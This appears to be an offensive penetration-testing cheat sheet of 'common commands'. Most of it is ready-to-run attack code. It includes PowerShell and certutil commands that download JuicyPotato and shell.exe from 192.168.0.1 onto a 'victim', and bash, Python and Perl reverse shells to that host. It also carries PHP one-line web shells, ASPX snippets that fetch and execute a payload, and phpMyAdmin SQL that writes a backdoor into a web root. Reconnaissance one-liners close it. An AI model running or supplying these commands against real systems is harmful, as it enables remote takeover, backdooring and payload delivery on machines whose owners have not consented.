common commands
==============================================================

# Powershell File Transfer As Cmd.exe Command
```bash
powershell -ExecutionPolicy bypass -noprofile -c (New-Object System.Net.WebClient).DownloadFile('http://192.168.0.1:80/winprivesc/JuicyPotato.exe','C:\Users\john\Desktop\juicy.exe')
```

# SMB List Drives (Execute on Victim)
```
net view \\192.168.0.1
```

# SMB Copy Files (Execute on Victim)
```
copy \\192.168.0.1\server_name\shell.exe shell.exe
```

# Netcat Receiving file
```bash
nc -l -p 1234 > out.file
```

# Netcat Sending file
```bash
nc -w 3 192.168.0.1 1234 < out.file
```

# python upgrade shell (TTY Shell)
```
python -c 'import pty;pty.spawn("/bin/bash");' 
```

# Bash Reverse Shell
```
/bin/bash -i >& /dev/tcp/192.168.0.1/4433 0>&1
```

# Python Reverse Shell As Command 
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

# Python Reverse Shell Code 
```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.0.1",4444));os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

# Kali Default PHP Reverse Shell
```bash
cat /usr/share/webshells/php/php-reverse-shell.php
```

# Kali Default PHP CMD Shell
```bash
cat /usr/share/webshells/php/php-backdoor.php
```

# coyote PHP command shell
```php
<?php system($_REQUEST[0]); ?>
```


# WhiteWinterWolf Webshell
https://github.com/WhiteWinterWolf/wwwolf-php-webshell

# Active Sever Pages Extended (.aspx) Transfer A File (Certutil)
```
<% 
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c certutil.exe -urlcache -f http://192.168.0.1/shell.exe C:\Windows\Temp\shell.exe")
o = cmd.StdOut.Readall()
Response.write(o)
%>
```

# Active Sever Pages Extended (.aspx) Execute a File
```
<% 
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c C:\Windows\Temp\shell.exe")
o = cmd.StdOut.Readall()
Response.write(o)
%>
```

# Perl Reverse Shell
```
perl -MIO -e 'use Socket;$ip="192.168.0.1";$port=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($port,inet_aton($ip)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

# PhpmyAdmin write shell
## Windows
Write a CMD shell into a file with the right permissions. Issue the following select. (Try different paths for different webservers)
```
SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\backdoor.php"
```

# linux
Write a CMD shell into a file with the right permissions. Issue the following select. (Try different paths for different webservers)
```
SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/shell.php"
```

# Sub domain Enum
```bash
findomain -t "$URL" -q
```

```bash
subfinder -d "$URL"
```

# URL CRAWL/ Discovery waybackurls
```bash
echo "$URL" | waybackurls| httpx-pd -silent > link.txt
```

